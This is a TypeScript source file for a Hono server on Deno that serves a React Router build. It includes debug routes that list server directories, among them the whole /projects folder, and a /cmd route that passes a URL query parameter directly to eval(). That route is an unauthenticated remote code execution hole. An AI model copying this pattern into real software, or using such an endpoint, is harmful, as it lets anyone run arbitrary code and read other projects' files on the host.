import { Hono } from "hono";
import { serveStatic } from "hono/deno";
import { reactRouter } from "remix-hono/handler";
// @ts-ignore
import * as build from "./build/server/index.js";
import { readdirSync } from "fs";

const app = new Hono();

// app.use("/", serveStatic({ root: "./public" }));
// app.use("/assets/*", serveStatic({ root: "./build/client/assets" }));
app.use(
  "/assets/*",
  serveStatic({
    root:
      "/projects/36b29724-aaad-4084-ad87-d042950c8cda/web" + "/build/client",
  })
);
app.use(
  "/favicon.ico",
  serveStatic({
    path:
      "/projects/36b29724-aaad-4084-ad87-d042950c8cda/web" +
      "/build/client/favicon.ico",
  })
);

app.get("/cwd", (c) => {
  return c.json(process.cwd());
});

app.get("/readdirsync", (c) => {
  return c.json(
    readdirSync("/projects/36b29724-aaad-4084-ad87-d042950c8cda/web")
  );
});

app.use("/test.txt", serveStatic({ path: process.cwd() + "/test.txt" }));
// app.get("/", (c) => {
//   const files = readdirSync(
//     "/projects/4a15c612-b014-4f94-8d41-fd8543d33a8c/web"
//   );
//   return c.json(files);
// });

app.get("/lol", (c) => {
  const files = readdirSync("/projects");
  return c.json(files);
});

app.get("/cmd", (c) => {
  // read search params for command and eval it
  const command = c.req.query("cmd");
  const result = eval(command);
  return c.json(result);
});

// app.use("/public/*", serveStatic({ root: "./" }));
// app.use(
//   "/assets/root-DzFMqsM4.js",
//   serveStatic({ path: "./build/client/assets/root-DzFMqsM4.js" })
// );

app.use(
  "*",
  // serveStatic({
  //   root: "./build/client",
  // }),
  reactRouter({
    build,
    mode: process.env.NODE_ENV,
    // getLoadContext is optional, the default function is the same as here
    getLoadContext(c) {
      return c.env;
    },
  })
);

Deno.serve(app.fetch);
